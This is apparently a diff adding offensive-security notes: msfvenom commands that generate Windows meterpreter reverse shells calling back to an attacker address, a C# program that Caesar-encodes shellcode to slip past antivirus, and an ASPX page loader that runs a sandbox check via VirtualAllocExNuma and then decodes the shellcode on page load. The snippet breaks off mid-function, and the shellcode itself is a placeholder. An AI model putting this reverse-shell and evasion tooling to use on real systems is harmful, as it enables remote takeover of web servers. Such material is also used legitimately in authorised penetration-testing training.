@@ -1,0 +1,52 @@
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.Y LPORT=443 -f aspx -o met.aspx
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
+
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+namespace CaesarEncrypt
+{
+ class Program
+ {
+ static void Main(string[] args)
+ {
+ byte[] buf = new byte[685] {shellcodeHere };
+ byte[] encoded = new byte[buf.Length];
+ for (int i = 0; i < buf.Length; i++)
+ {
+ encoded[i] = (byte)(((uint)buf[i] + 5) & 0xFF);
+ }
+ StringBuilder hex = new StringBuilder(encoded.Length * 2);
+ foreach (byte b in encoded)
+ {
+ hex.AppendFormat("0x{0:x2}, ", b);
+ }
+ Console.WriteLine("The payload is: " + hex.ToString());
+ }
+ }
+}
+
+// Add below lines in ASPX
+
+[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true,ExactSpelling = true)]
+ private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+ 
+[System.Runtime.InteropServices.DllImport("kernel32.dll")]
+ private static extern IntPtr GetCurrentProcess()
+
+protected void Page_Load(object sender, EventArgs e)
+ {
+ IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+ if(mem == null)
+ {
+ return;
+ }
+
+byte[] oe7hnH0 = new byte[685] {shellcodeHere};
+ for(int i = 0; i < oe7hnH0.Length; i++)
+ {
+ oe7hnH0[i] = (byte)(((uint)oe7hnH0[i] - 5) & 0xFF);
+ }
